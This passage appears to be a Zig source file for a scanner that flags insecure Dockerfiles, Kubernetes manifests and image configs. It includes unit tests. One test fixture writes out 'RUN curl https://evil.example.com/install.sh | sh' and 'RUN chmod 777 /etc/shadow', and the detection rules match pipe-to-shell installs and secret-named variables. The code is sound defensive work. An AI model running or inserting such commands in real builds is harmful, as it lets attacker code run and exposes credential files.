//! IaC misconfiguration analyzer. Dockerfiles use a line-oriented text
//! scan (the format is line-significant). Kubernetes manifests are parsed
//! as YAML and walked structurally — anchors, aliases, multi-document
//! streams, and flow vs. block style all resolve to the same AST before
//! rules fire, so e.g. an alias that injects `privileged: true` is
//! flagged the same way an inline value would be.
//!
//! Rules are stable IDs (DKR### / K8S###) so downstream consumers can
//! suppress or grade specific findings without depending on text matches.

const std = @import("std");
const errors = @import("../errors.zig");
const yaml = @import("../yaml.zig");

pub const Severity = enum { info, low, medium, high, critical };

pub const Source = enum { dockerfile, kubernetes, image_config };

pub const Issue = struct {
    rule_id: []u8, // owned, e.g. "DKR001"
    title: []u8, // owned
    severity: Severity,
    source: Source,
    file: []u8, // owned
    line: u32, // 1-based; 0 means whole-document
    snippet: []u8, // owned, redacted/trimmed
    recommendation: []u8, // owned
};

pub const Issues = struct {
    items: []Issue,

    pub fn deinit(self: *Issues, allocator: std.mem.Allocator) void {
        for (self.items) |it| freeIssue(allocator, it);
        allocator.free(self.items);
        self.items = &.{};
    }
};

pub fn freeIssue(allocator: std.mem.Allocator, it: Issue) void {
    allocator.free(it.rule_id);
    allocator.free(it.title);
    allocator.free(it.file);
    allocator.free(it.snippet);
    allocator.free(it.recommendation);
}

// ----------------------------------------------------------------------------
// Dispatch
// ----------------------------------------------------------------------------

pub const ConfigType = enum { auto, dockerfile, kubernetes };

pub fn audit(
    allocator: std.mem.Allocator,
    bytes: []const u8,
    path: []const u8,
    kind: ConfigType,
) errors.ScribeError!Issues {
    return switch (kind) {
        .dockerfile => auditDockerfile(allocator, bytes, path),
        .kubernetes => auditKubernetes(allocator, bytes, path),
        .auto => detectAndAudit(allocator, bytes, path),
    };
}

pub fn detectAndAudit(
    allocator: std.mem.Allocator,
    bytes: []const u8,
    path: []const u8,
) errors.ScribeError!Issues {
    const base = basename(path);

    if (std.mem.eql(u8, base, "Dockerfile") or
        std.mem.eql(u8, base, "Containerfile") or
        std.mem.startsWith(u8, base, "Dockerfile.") or
        std.mem.startsWith(u8, base, "Containerfile.") or
        std.mem.endsWith(u8, base, ".Dockerfile") or
        std.mem.endsWith(u8, base, ".Containerfile"))
    {
        return auditDockerfile(allocator, bytes, path);
    }

    if (std.mem.endsWith(u8, base, ".yaml") or std.mem.endsWith(u8, base, ".yml")) {
        return auditKubernetes(allocator, bytes, path);
    }

    if (looksLikeDockerfile(bytes)) return auditDockerfile(allocator, bytes, path);
    if (looksLikeKubernetes(bytes)) return auditKubernetes(allocator, bytes, path);

    return error.NotImplemented;
}

fn basename(path: []const u8) []const u8 {
    if (std.mem.lastIndexOfScalar(u8, path, '/')) |i| return path[i + 1 ..];
    if (std.mem.lastIndexOfScalar(u8, path, '\\')) |i| return path[i + 1 ..];
    return path;
}

fn looksLikeDockerfile(bytes: []const u8) bool {
    var it = std.mem.splitScalar(u8, bytes, '\n');
    while (it.next()) |line| {
        const trimmed = std.mem.trim(u8, line, " \t\r");
        if (trimmed.len == 0 or trimmed[0] == '#') continue;
        if (std.ascii.startsWithIgnoreCase(trimmed, "FROM ")) return true;
        return false;
    }
    return false;
}

fn looksLikeKubernetes(bytes: []const u8) bool {
    return std.mem.indexOf(u8, bytes, "apiVersion:") != null and
        std.mem.indexOf(u8, bytes, "kind:") != null;
}

// ----------------------------------------------------------------------------
// Dockerfile audit
// ----------------------------------------------------------------------------

pub fn auditDockerfile(
    allocator: std.mem.Allocator,
    bytes: []const u8,
    path: []const u8,
) errors.ScribeError!Issues {
    var list: std.ArrayList(Issue) = .empty;
    errdefer {
        for (list.items) |it| freeIssue(allocator, it);
        list.deinit(allocator);
    }

    var has_user_directive = false;
    var has_healthcheck = false;
    var has_from = false;
    var line_no: u32 = 0;
    var it = std.mem.splitScalar(u8, bytes, '\n');
    while (it.next()) |raw_line| {
        line_no += 1;
        const line = std.mem.trim(u8, raw_line, " \t\r");
        if (line.len == 0 or line[0] == '#') continue;

        const sp = std.mem.indexOfScalar(u8, line, ' ') orelse line.len;
        const instr = line[0..sp];
        const args = if (sp < line.len) std.mem.trim(u8, line[sp + 1 ..], " \t") else "";

        if (eqlIgnoreCase(instr, "FROM")) {
            has_from = true;
            // No tag (no ':' before optional ' AS alias') or :latest tag.
            const image = imageFromFrom(args);
            if (image.len > 0) {
                const colon = std.mem.lastIndexOfScalar(u8, image, ':');
                const at = std.mem.indexOfScalar(u8, image, '@');
                if (at == null) {
                    if (colon == null) {
                        try addIssue(allocator, &list, .{
                            .rule_id = "DKR003",
                            .title = "FROM image without explicit tag (defaults to :latest)",
                            .severity = .low,
                            .source = .dockerfile,
                            .path = path,
                            .line = line_no,
                            .snippet = line,
                            .recommendation = "Pin to a specific tag or @sha256: digest.",
                        });
                    } else if (std.mem.eql(u8, image[colon.? + 1 ..], "latest")) {
                        try addIssue(allocator, &list, .{
                            .rule_id = "DKR003",
                            .title = "FROM uses :latest tag",
                            .severity = .low,
                            .source = .dockerfile,
                            .path = path,
                            .line = line_no,
                            .snippet = line,
                            .recommendation = "Pin to a specific tag or @sha256: digest.",
                        });
                    }
                }
            }
        } else if (eqlIgnoreCase(instr, "USER")) {
            has_user_directive = true;
            if (eqlIgnoreCase(args, "root") or std.mem.eql(u8, args, "0") or
                std.mem.startsWith(u8, args, "0:"))
            {
                try addIssue(allocator, &list, .{
                    .rule_id = "DKR001",
                    .title = "USER root (or UID 0)",
                    .severity = .high,
                    .source = .dockerfile,
                    .path = path,
                    .line = line_no,
                    .snippet = line,
                    .recommendation = "Switch to a non-root user (e.g. USER nobody or a dedicated UID).",
                });
            }
        } else if (eqlIgnoreCase(instr, "ADD")) {
            if (std.mem.indexOf(u8, args, "://") != null) {
                try addIssue(allocator, &list, .{
                    .rule_id = "DKR002",
                    .title = "ADD with remote URL",
                    .severity = .medium,
                    .source = .dockerfile,
                    .path = path,
                    .line = line_no,
                    .snippet = line,
                    .recommendation = "Prefer COPY for local files; for remote, RUN curl | sha256sum -c.",
                });
            }
        } else if (eqlIgnoreCase(instr, "RUN")) {
            if (std.mem.indexOf(u8, args, "--privileged") != null) {
                try addIssue(allocator, &list, .{
                    .rule_id = "DKR004",
                    .title = "RUN with --privileged",
                    .severity = .critical,
                    .source = .dockerfile,
                    .path = path,
                    .line = line_no,
                    .snippet = line,
                    .recommendation = "Drop --privileged; grant only the capabilities required.",
                });
            }
            if (std.mem.indexOf(u8, args, "chmod 777") != null or
                std.mem.indexOf(u8, args, "chmod -R 777") != null)
            {
                try addIssue(allocator, &list, .{
                    .rule_id = "DKR008",
                    .title = "World-writable chmod (777)",
                    .severity = .high,
                    .source = .dockerfile,
                    .path = path,
                    .line = line_no,
                    .snippet = line,
                    .recommendation = "Use the most restrictive mode that works (e.g. 755 / 644).",
                });
            }
            const has_dl = std.mem.indexOf(u8, args, "curl ") != null or
                std.mem.indexOf(u8, args, "wget ") != null;
            const has_pipe_sh = std.mem.indexOf(u8, args, "| sh") != null or
                std.mem.indexOf(u8, args, "| bash") != null;
            if (has_dl and has_pipe_sh) {
                try addIssue(allocator, &list, .{
                    .rule_id = "DKR009",
                    .title = "Pipe-to-shell network install",
                    .severity = .high,
                    .source = .dockerfile,
                    .path = path,
                    .line = line_no,
                    .snippet = line,
                    .recommendation = "Download to a file, verify a checksum, then execute.",
                });
            }
            if (std.mem.indexOf(u8, args, "apt-get install") != null and
                std.mem.indexOf(u8, args, "--no-install-recommends") == null)
            {
                try addIssue(allocator, &list, .{
                    .rule_id = "DKR007",
                    .title = "apt-get install without --no-install-recommends",
                    .severity = .info,
                    .source = .dockerfile,
                    .path = path,
                    .line = line_no,
                    .snippet = line,
                    .recommendation = "Add --no-install-recommends to shrink the image and attack surface.",
                });
            }
        } else if (eqlIgnoreCase(instr, "ENV")) {
            if (envLooksLikeSecret(args)) {
                try addIssue(allocator, &list, .{
                    .rule_id = "DKR005",
                    .title = "Secret-like value in ENV",
                    .severity = .high,
                    .source = .dockerfile,
                    .path = path,
                    .line = line_no,
                    .snippet = line,
                    .recommendation = "Use BuildKit secrets, runtime env, or a secrets manager — not ENV.",
                });
            }
        } else if (eqlIgnoreCase(instr, "HEALTHCHECK")) {
            has_healthcheck = true;
        }
    }

    if (has_from and !has_user_directive) {
        try addIssue(allocator, &list, .{
            .rule_id = "DKR001",
            .title = "No USER directive (defaults to root)",
            .severity = .high,
            .source = .dockerfile,
            .path = path,
            .line = 0,
            .snippet = "",
            .recommendation = "Add a non-root USER directive before CMD/ENTRYPOINT.",
        });
    }
    if (has_from and !has_healthcheck) {
        try addIssue(allocator, &list, .{
            .rule_id = "DKR006",
            .title = "Missing HEALTHCHECK",
            .severity = .info,
            .source = .dockerfile,
            .path = path,
            .line = 0,
            .snippet = "",
            .recommendation = "Add a HEALTHCHECK so orchestrators can detect broken containers.",
        });
    }

    const items = list.toOwnedSlice(allocator) catch return error.OutOfMemory;
    return .{ .items = items };
}

fn imageFromFrom(args: []const u8) []const u8 {
    // FROM image[:tag][@digest] [AS alias]  -- strip "AS alias" suffix.
    var s = args;
    if (std.ascii.indexOfIgnoreCase(s, " as ")) |i| s = s[0..i];
    return std.mem.trim(u8, s, " \t");
}

fn envLooksLikeSecret(args: []const u8) bool {
    // ENV KEY=VAL or ENV KEY VAL. Look for risky key names.
    var s = args;
    if (std.mem.indexOfScalar(u8, s, '=')) |eq| {
        s = s[0..eq];
    } else if (std.mem.indexOfScalar(u8, s, ' ')) |sp| {
        s = s[0..sp];
    }
    const key_lower = lowercaseStack(s);
    const needles = [_][]const u8{ "password", "passwd", "secret", "api_key", "apikey", "token", "private_key" };
    inline for (needles) |needle| {
        if (std.mem.indexOf(u8, &key_lower, needle) != null) return true;
    }
    return false;
}

fn lowercaseStack(s: []const u8) [256]u8 {
    var out: [256]u8 = @splat(0);
    const n = @min(s.len, out.len);
    for (s[0..n], 0..) |c, i| out[i] = std.ascii.toLower(c);
    return out;
}

// ----------------------------------------------------------------------------
// Kubernetes YAML audit
// ----------------------------------------------------------------------------

pub fn auditKubernetes(
    allocator: std.mem.Allocator,
    bytes: []const u8,
    path: []const u8,
) errors.ScribeError!Issues {
    var list: std.ArrayList(Issue) = .empty;
    errdefer {
        for (list.items) |it| freeIssue(allocator, it);
        list.deinit(allocator);
    }

    // Parse the manifest into a YAML AST. If parsing fails (truly broken
    // input), fall back to no findings rather than aborting the whole
    // security scan — the SBOM/secrets/CVE passes can still produce useful
    // output for the same target.
    var stream = yaml.parse(allocator, bytes) catch {
        const items = list.toOwnedSlice(allocator) catch return error.OutOfMemory;
        return .{ .items = items };
    };
    defer stream.deinit(allocator);

    for (stream.documents) |doc| {
        try auditK8sDocument(allocator, &list, doc.root, path);
    }

    const items = list.toOwnedSlice(allocator) catch return error.OutOfMemory;
    return .{ .items = items };
}

fn auditK8sDocument(
    allocator: std.mem.Allocator,
    list: *std.ArrayList(Issue),
    root: yaml.Node,
    path: []const u8,
) errors.ScribeError!void {
    if (root.kind != .mapping) return;

    const kind_str = root.getScalar("kind") orelse "";
    const is_workload = isWorkloadKind(kind_str);

    const KvRule = struct {
        rule_id: []const u8,
        title: []const u8,
        recommendation: []const u8,
        severity: Severity,
        key: []const u8,
        value: []const u8,
    };
    const kv_rules = [_]KvRule{
        .{ .rule_id = "K8S001", .title = "runAsNonRoot: false", .severity = .high,
           .key = "runAsNonRoot", .value = "false",
           .recommendation = "Set runAsNonRoot: true and runAsUser to a non-zero UID." },
        .{ .rule_id = "K8S003", .title = "runAsUser: 0 (root)", .severity = .high,
           .key = "runAsUser", .value = "0",
           .recommendation = "Set runAsUser to a non-zero UID." },
        .{ .rule_id = "K8S004", .title = "hostNetwork: true", .severity = .critical,
           .key = "hostNetwork", .value = "true",
           .recommendation = "Disable hostNetwork unless the workload genuinely needs the host network namespace." },
        .{ .rule_id = "K8S005", .title = "hostPID: true", .severity = .critical,
           .key = "hostPID", .value = "true",
           .recommendation = "Disable hostPID unless the workload genuinely needs the host PID namespace." },
        .{ .rule_id = "K8S006", .title = "privileged: true", .severity = .critical,
           .key = "privileged", .value = "true",
           .recommendation = "Drop privileged; grant only specific capabilities via securityContext.capabilities.add." },
        .{ .rule_id = "K8S009", .title = "automountServiceAccountToken: true (default)", .severity = .medium,
           .key = "automountServiceAccountToken", .value = "true",
           .recommendation = "Set automountServiceAccountToken: false unless the workload uses the API." },
        .{ .rule_id = "K8S011", .title = "allowPrivilegeEscalation: true", .severity = .high,
           .key = "allowPrivilegeEscalation", .value = "true",
           .recommendation = "Set allowPrivilegeEscalation: false." },
    };

    for (kv_rules) |r| {
        try findKvAndAdd(allocator, list, root, path, r.key, r.value, r.rule_id, r.title, r.severity, r.recommendation);
    }

    try findCapabilitiesSysAdmin(allocator, list, root, path);
    try findImageLatestAst(allocator, list, root, path);

    if (is_workload) {
        if (!hasDescendantMappingKey(root, "securityContext")) {
            try addIssue(allocator, list, .{
                .rule_id = "K8S002",
                .title = "Workload missing securityContext block",
                .severity = .medium,
                .source = .kubernetes,
                .path = path,
                .line = 0,
                .snippet = "",
                .recommendation = "Add securityContext with runAsNonRoot, readOnlyRootFilesystem, and capabilities.drop: ['ALL'].",
            });
        }
        if (!hasDescendantMappingKey(root, "resources")) {
            try addIssue(allocator, list, .{
                .rule_id = "K8S008",
                .title = "Workload missing resources.limits / requests",
                .severity = .low,
                .source = .kubernetes,
                .path = path,
                .line = 0,
                .snippet = "",
                .recommendation = "Set resources.requests and resources.limits to bound CPU/memory.",
            });
        }
    }
}

/// Compare a YAML scalar to a rule's expected value, accepting YAML 1.1
/// boolean aliases (`yes`/`no`/`on`/`off` and case variants) when the
/// expected value is `true` or `false`. Older Helm charts and ops-team
/// k8s manifests still use the 1.1 spelling for booleans, so we normalize
/// before matching rather than forcing the rules to enumerate every case.
fn scalarMatches(scalar: []const u8, expected: []const u8) bool {
    if (std.mem.eql(u8, scalar, expected)) return true;
    if (std.mem.eql(u8, expected, "true")) return isYamlTrue(scalar);
    if (std.mem.eql(u8, expected, "false")) return isYamlFalse(scalar);
    return false;
}

fn isYamlTrue(s: []const u8) bool {
    const aliases = [_][]const u8{ "true", "True", "TRUE", "yes", "Yes", "YES", "on", "On", "ON" };
    for (aliases) |a| if (std.mem.eql(u8, s, a)) return true;
    return false;
}

fn isYamlFalse(s: []const u8) bool {
    const aliases = [_][]const u8{ "false", "False", "FALSE", "no", "No", "NO", "off", "Off", "OFF" };
    for (aliases) |a| if (std.mem.eql(u8, s, a)) return true;
    return false;
}

fn isWorkloadKind(kind: []const u8) bool {
    const kinds = [_][]const u8{
        "Pod", "Deployment", "StatefulSet", "DaemonSet",
        "Job", "CronJob", "ReplicaSet",
    };
    for (kinds) |k| {
        if (std.mem.eql(u8, kind, k)) return true;
    }
    return false;
}

/// Recursively walk the tree and emit an issue at every mapping where
/// `key: value` matches. Multiple matches in different containers each
/// produce a finding (line numbers carry from yaml.zig).
fn findKvAndAdd(
    allocator: std.mem.Allocator,
    list: *std.ArrayList(Issue),
    node: yaml.Node,
    path: []const u8,
    key: []const u8,
    expected: []const u8,
    rule_id: []const u8,
    title: []const u8,
    severity: Severity,
    recommendation: []const u8,
) errors.ScribeError!void {
    switch (node.kind) {
        .mapping => {
            for (node.map) |kv| {
                if (std.mem.eql(u8, kv.key, key) and kv.value.kind == .scalar and
                    scalarMatches(kv.value.scalar, expected))
                {
                    try addIssue(allocator, list, .{
                        .rule_id = rule_id,
                        .title = title,
                        .severity = severity,
                        .source = .kubernetes,
                        .path = path,
                        .line = kv.line,
                        .snippet = "",
                        .recommendation = recommendation,
                    });
                }
                try findKvAndAdd(allocator, list, kv.value, path, key, expected, rule_id, title, severity, recommendation);
            }
        },
        .sequence => {
            for (node.seq) |child| {
                try findKvAndAdd(allocator, list, child, path, key, expected, rule_id, title, severity, recommendation);
            }
        },
        .scalar => {},
    }
}

fn findCapabilitiesSysAdmin(
    allocator: std.mem.Allocator,
    list: *std.ArrayList(Issue),
    node: yaml.Node,
    path: []const u8,
) errors.ScribeError!void {
    switch (node.kind) {
        .mapping => {
            for (node.map) |kv| {
                if (std.mem.eql(u8, kv.key, "capabilities") and kv.value.kind == .mapping) {
                    if (kv.value.get("add")) |add_node| {
                        if (add_node.kind == .sequence) {
                            for (add_node.seq) |item| {
                                if (item.kind == .scalar and std.mem.eql(u8, item.scalar, "SYS_ADMIN")) {
                                    try addIssue(allocator, list, .{
                                        .rule_id = "K8S007",
                                        .title = "capabilities.add includes SYS_ADMIN",
                                        .severity = .critical,
                                        .source = .kubernetes,
                                        .path = path,
                                        .line = if (item.line != 0) item.line else add_node.line,
                                        .snippet = "SYS_ADMIN",
                                        .recommendation = "Drop SYS_ADMIN; it is effectively root.",
                                    });
                                }
                            }
                        }
                    }
                }
                try findCapabilitiesSysAdmin(allocator, list, kv.value, path);
            }
        },
        .sequence => for (node.seq) |child| try findCapabilitiesSysAdmin(allocator, list, child, path),
        .scalar => {},
    }
}

fn findImageLatestAst(
    allocator: std.mem.Allocator,
    list: *std.ArrayList(Issue),
    node: yaml.Node,
    path: []const u8,
) errors.ScribeError!void {
    switch (node.kind) {
        .mapping => {
            for (node.map) |kv| {
                if (std.mem.eql(u8, kv.key, "image") and kv.value.kind == .scalar) {
                    const img = kv.value.scalar;
                    if (img.len > 0 and imageDefaultsToLatest(img)) {
                        try addIssue(allocator, list, .{
                            .rule_id = "K8S010",
                            .title = "image uses :latest tag",
                            .severity = .low,
                            .source = .kubernetes,
                            .path = path,
                            .line = kv.line,
                            .snippet = img,
                            .recommendation = "Pin to a specific tag or @sha256: digest.",
                        });
                    }
                }
                try findImageLatestAst(allocator, list, kv.value, path);
            }
        },
        .sequence => for (node.seq) |child| try findImageLatestAst(allocator, list, child, path),
        .scalar => {},
    }
}

fn imageDefaultsToLatest(img: []const u8) bool {
    if (std.mem.endsWith(u8, img, ":latest")) return true;
    // A digest pin (`name@sha256:...`) is explicit — never warn.
    if (std.mem.indexOfScalar(u8, img, '@') != null) return false;
    // No `:tag` at all → docker resolves as :latest.
    if (std.mem.lastIndexOfScalar(u8, img, ':') == null) return true;
    return false;
}

fn hasDescendantMappingKey(node: yaml.Node, key: []const u8) bool {
    switch (node.kind) {
        .mapping => {
            for (node.map) |kv| {
                if (std.mem.eql(u8, kv.key, key)) return true;
                if (hasDescendantMappingKey(kv.value, key)) return true;
            }
            return false;
        },
        .sequence => {
            for (node.seq) |child| {
                if (hasDescendantMappingKey(child, key)) return true;
            }
            return false;
        },
        .scalar => return false,
    }
}

// ----------------------------------------------------------------------------
// Issue construction
// ----------------------------------------------------------------------------

const IssueSpec = struct {
    rule_id: []const u8,
    title: []const u8,
    severity: Severity,
    source: Source,
    path: []const u8,
    line: u32,
    snippet: []const u8,
    recommendation: []const u8,
};

fn addIssue(
    allocator: std.mem.Allocator,
    list: *std.ArrayList(Issue),
    spec: IssueSpec,
) errors.ScribeError!void {
    const issue: Issue = .{
        .rule_id = try allocator.dupe(u8, spec.rule_id),
        .title = try allocator.dupe(u8, spec.title),
        .severity = spec.severity,
        .source = spec.source,
        .file = try allocator.dupe(u8, spec.path),
        .line = spec.line,
        .snippet = try allocator.dupe(u8, std.mem.trim(u8, spec.snippet, " \t\r\n")),
        .recommendation = try allocator.dupe(u8, spec.recommendation),
    };
    list.append(allocator, issue) catch return error.OutOfMemory;
}

fn eqlIgnoreCase(a: []const u8, b: []const u8) bool {
    return std.ascii.eqlIgnoreCase(a, b);
}

// ----------------------------------------------------------------------------
// OCI image-config audit
//
// Walks the parsed Config blob of a Docker / OCI image and flags effective
// runtime hygiene problems:
//   OCI001 — User missing / "root" / "0"               (high)
//   OCI002 — Env contains a secret-like key=value pair (high)
//   OCI003 — Healthcheck missing or set to NONE        (info)
//   OCI004 — ExposedPorts includes SSH (22/tcp)        (medium)
//
// Rules complement the Dockerfile-text checks: image-config rules see the
// final effective state after multi-stage builds and FROM inheritance,
// which the Dockerfile-text rules can miss.
// ----------------------------------------------------------------------------

pub fn auditImageConfig(
    allocator: std.mem.Allocator,
    json_bytes: []const u8,
    image_label: []const u8,
) errors.ScribeError!Issues {
    const Doc = struct {
        config: ?struct {
            User: ?[]const u8 = null,
            Env: ?[]const []const u8 = null,
            Cmd: ?[]const []const u8 = null,
            Entrypoint: ?[]const []const u8 = null,
            Healthcheck: ?struct {
                Test: ?[]const []const u8 = null,
            } = null,
            ExposedPorts: ?std.json.ArrayHashMap(struct {}) = null,
            Labels: ?std.json.ArrayHashMap([]const u8) = null,
        } = null,
    };

    const parsed = std.json.parseFromSlice(Doc, allocator, json_bytes, .{
        .ignore_unknown_fields = true,
    }) catch return error.NotImplemented;
    defer parsed.deinit();

    var list: std.ArrayList(Issue) = .empty;
    errdefer {
        for (list.items) |it| freeIssue(allocator, it);
        list.deinit(allocator);
    }

    const cfg = parsed.value.config orelse return .{ .items = &.{} };

    // OCI001: USER root / 0 / missing.
    const user = cfg.User orelse "";
    if (user.len == 0 or std.mem.eql(u8, user, "root") or
        std.mem.eql(u8, user, "0") or std.mem.startsWith(u8, user, "0:"))
    {
        try addIssue(allocator, &list, .{
            .rule_id = "OCI001",
            .title = if (user.len == 0)
                "image config has no USER (defaults to root)"
            else
                "image config USER is root / UID 0",
            .severity = .high,
            .source = .image_config,
            .path = image_label,
            .line = 0,
            .snippet = user,
            .recommendation = "Set Config.User to a non-zero UID in the final image layer.",
        });
    }

    // OCI002: secret-like Env entries.
    if (cfg.Env) |envs| {
        for (envs) |entry| {
            if (envLooksLikeSecret(entry)) {
                try addIssue(allocator, &list, .{
                    .rule_id = "OCI002",
                    .title = "image config Env contains a secret-like value",
                    .severity = .high,
                    .source = .image_config,
                    .path = image_label,
                    .line = 0,
                    .snippet = redactEnvEntry(entry),
                    .recommendation = "Pass secrets at runtime (env file, secrets manager); never bake into the image.",
                });
            }
        }
    }

    // OCI003: missing or disabled Healthcheck.
    const hc_disabled = blk: {
        const hc = cfg.Healthcheck orelse break :blk true;
        const test_cmd = hc.Test orelse break :blk true;
        if (test_cmd.len == 0) break :blk true;
        if (std.mem.eql(u8, test_cmd[0], "NONE")) break :blk true;
        break :blk false;
    };
    if (hc_disabled) {
        try addIssue(allocator, &list, .{
            .rule_id = "OCI003",
            .title = "image has no HEALTHCHECK (or set to NONE)",
            .severity = .info,
            .source = .image_config,
            .path = image_label,
            .line = 0,
            .snippet = "",
            .recommendation = "Add a HEALTHCHECK so orchestrators can detect broken containers.",
        });
    }

    // OCI004: SSH port exposed.
    if (cfg.ExposedPorts) |ports| {
        var it = ports.map.iterator();
        while (it.next()) |kv| {
            if (std.mem.startsWith(u8, kv.key_ptr.*, "22/")) {
                try addIssue(allocator, &list, .{
                    .rule_id = "OCI004",
                    .title = "image exposes SSH port (22)",
                    .severity = .medium,
                    .source = .image_config,
                    .path = image_label,
                    .line = 0,
                    .snippet = kv.key_ptr.*,
                    .recommendation = "Drop ExposedPorts 22; SSH inside containers is an anti-pattern.",
                });
                break;
            }
        }
    }

    const items = list.toOwnedSlice(allocator) catch return error.OutOfMemory;
    return .{ .items = items };
}

/// Best-effort redaction of an `Env` entry to keep the secret value out of
/// the snippet. Returns `KEY=<redacted>` for `KEY=...` form.
fn redactEnvEntry(entry: []const u8) []const u8 {
    if (std.mem.indexOfScalar(u8, entry, '=')) |i| {
        return entry[0..i];
    }
    return entry;
}

// ----------------------------------------------------------------------------
// Tests
// ----------------------------------------------------------------------------

const testing = std.testing;

fn countByRule(issues: []Issue, rule: []const u8) usize {
    var n: usize = 0;
    for (issues) |it| if (std.mem.eql(u8, it.rule_id, rule)) { n += 1; };
    return n;
}

fn hasRule(issues: []Issue, rule: []const u8) bool {
    return countByRule(issues, rule) > 0;
}

test "Dockerfile: USER root flagged" {
    const df =
        \\FROM alpine:3.19
        \\USER root
        \\HEALTHCHECK CMD true
        \\CMD ["sh"]
    ;
    var r = try auditDockerfile(testing.allocator, df, "Dockerfile");
    defer r.deinit(testing.allocator);
    try testing.expect(hasRule(r.items, "DKR001"));
}

test "Dockerfile: missing USER flagged" {
    const df =
        \\FROM alpine:3.19
        \\HEALTHCHECK CMD true
        \\CMD ["sh"]
    ;
    var r = try auditDockerfile(testing.allocator, df, "Dockerfile");
    defer r.deinit(testing.allocator);
    try testing.expect(hasRule(r.items, "DKR001"));
}

test "Dockerfile: USER nonroot is clean of DKR001" {
    const df =
        \\FROM alpine:3.19
        \\USER 1000:1000
        \\HEALTHCHECK CMD true
        \\CMD ["sh"]
    ;
    var r = try auditDockerfile(testing.allocator, df, "Dockerfile");
    defer r.deinit(testing.allocator);
    try testing.expect(!hasRule(r.items, "DKR001"));
}

test "Dockerfile: ADD URL flagged, COPY clean" {
    const df =
        \\FROM alpine:3.19
        \\ADD https://example.com/foo.tar.gz /opt/foo.tar.gz
        \\COPY ./script.sh /usr/local/bin/script.sh
        \\USER 1000
        \\HEALTHCHECK CMD true
    ;
    var r = try auditDockerfile(testing.allocator, df, "Dockerfile");
    defer r.deinit(testing.allocator);
    try testing.expect(hasRule(r.items, "DKR002"));
}

test "Dockerfile: latest tag and unpinned base flagged" {
    const df1 = "FROM alpine:latest\nUSER 1000\nHEALTHCHECK CMD true\n";
    var r1 = try auditDockerfile(testing.allocator, df1, "Dockerfile");
    defer r1.deinit(testing.allocator);
    try testing.expect(hasRule(r1.items, "DKR003"));

    const df2 = "FROM alpine\nUSER 1000\nHEALTHCHECK CMD true\n";
    var r2 = try auditDockerfile(testing.allocator, df2, "Dockerfile");
    defer r2.deinit(testing.allocator);
    try testing.expect(hasRule(r2.items, "DKR003"));

    const df3 = "FROM alpine:3.19\nUSER 1000\nHEALTHCHECK CMD true\n";
    var r3 = try auditDockerfile(testing.allocator, df3, "Dockerfile");
    defer r3.deinit(testing.allocator);
    try testing.expect(!hasRule(r3.items, "DKR003"));
}

test "Dockerfile: --privileged, chmod 777, curl|sh, secret env" {
    const df =
        \\FROM alpine:3.19
        \\USER 1000
        \\HEALTHCHECK CMD true
        \\RUN --privileged true
        \\RUN chmod 777 /etc/shadow
        \\RUN curl https://evil.example.com/install.sh | sh
        \\ENV DB_PASSWORD=hunter2
    ;
    var r = try auditDockerfile(testing.allocator, df, "Dockerfile");
    defer r.deinit(testing.allocator);
    try testing.expect(hasRule(r.items, "DKR004"));
    try testing.expect(hasRule(r.items, "DKR008"));
    try testing.expect(hasRule(r.items, "DKR009"));
    try testing.expect(hasRule(r.items, "DKR005"));
}

test "Dockerfile: clean Dockerfile reports only HEALTHCHECK info if missing" {
    const df =
        \\FROM alpine:3.19
        \\USER 1000:1000
        \\COPY app /usr/local/bin/app
        \\HEALTHCHECK CMD /usr/local/bin/app --check
        \\CMD ["app"]
    ;
    var r = try auditDockerfile(testing.allocator, df, "Dockerfile");
    defer r.deinit(testing.allocator);
    try testing.expectEqual(@as(usize, 0), r.items.len);
}

test "Kubernetes: privileged + hostNetwork flagged" {
    const manifest =
        \\apiVersion: v1
        \\kind: Pod
        \\metadata:
        \\  name: bad
        \\spec:
        \\  hostNetwork: true
        \\  containers:
        \\  - name: c
        \\    image: nginx:1.27
        \\    securityContext:
        \\      privileged: true
        \\    resources:
        \\      requests: {cpu: "10m"}
    ;
    var r = try auditKubernetes(testing.allocator, manifest, "pod.yaml");
    defer r.deinit(testing.allocator);
    try testing.expect(hasRule(r.items, "K8S004"));
    try testing.expect(hasRule(r.items, "K8S006"));
}

test "Kubernetes: missing securityContext on Deployment" {
    const manifest =
        \\apiVersion: apps/v1
        \\kind: Deployment
        \\metadata:
        \\  name: app
        \\spec:
        \\  template:
        \\    spec:
        \\      containers:
        \\      - name: c
        \\        image: app:1.0
        \\        resources: {}
    ;
    var r = try auditKubernetes(testing.allocator, manifest, "deploy.yaml");
    defer r.deinit(testing.allocator);
    try testing.expect(hasRule(r.items, "K8S002"));
}

test "Kubernetes: image latest tag flagged" {
    const manifest =
        \\apiVersion: v1
        \\kind: Pod
        \\metadata: {name: p}
        \\spec:
        \\  containers:
        \\  - name: c
        \\    image: alpine:latest
        \\    securityContext: {runAsNonRoot: true}
        \\    resources: {limits: {cpu: "1"}}
    ;
    var r = try auditKubernetes(testing.allocator, manifest, "p.yaml");
    defer r.deinit(testing.allocator);
    try testing.expect(hasRule(r.items, "K8S010"));
}

test "Kubernetes: SYS_ADMIN capability flagged" {
    const manifest =
        \\apiVersion: v1
        \\kind: Pod
        \\metadata: {name: p}
        \\spec:
        \\  containers:
        \\  - name: c
        \\    image: a:1
        \\    securityContext:
        \\      capabilities:
        \\        add: ["SYS_ADMIN"]
        \\    resources: {limits: {cpu: "1"}}
    ;
    var r = try auditKubernetes(testing.allocator, manifest, "p.yaml");
    defer r.deinit(testing.allocator);
    try testing.expect(hasRule(r.items, "K8S007"));
}

test "Kubernetes: YAML 1.1 boolean aliases trigger bool rules" {
    // `privileged: yes` and `hostNetwork: On` are YAML 1.1 spellings of
    // true. Older k8s base configs and Helm output still emit them; the
    // audit must treat them the same as `: true`.
    const manifest =
        \\apiVersion: v1
        \\kind: Pod
        \\metadata: {name: legacy}
        \\spec:
        \\  hostNetwork: On
        \\  containers:
        \\  - name: c
        \\    image: a:1
        \\    securityContext:
        \\      privileged: yes
        \\      runAsNonRoot: NO
        \\    resources: {limits: {cpu: "1"}}
    ;
    var r = try auditKubernetes(testing.allocator, manifest, "legacy.yaml");
    defer r.deinit(testing.allocator);
    try testing.expect(hasRule(r.items, "K8S004")); // hostNetwork: On
    try testing.expect(hasRule(r.items, "K8S006")); // privileged: yes
    try testing.expect(hasRule(r.items, "K8S001")); // runAsNonRoot: NO
}

test "Kubernetes: merge key inlines anchored securityContext" {
    // Common Helm pattern: anchor a "bad defaults" block, merge it into a
    // workload's securityContext. The audit must see the merged keys, not
    // just the anchor itself.
    const manifest =
        \\bad: &bad
        \\  privileged: true
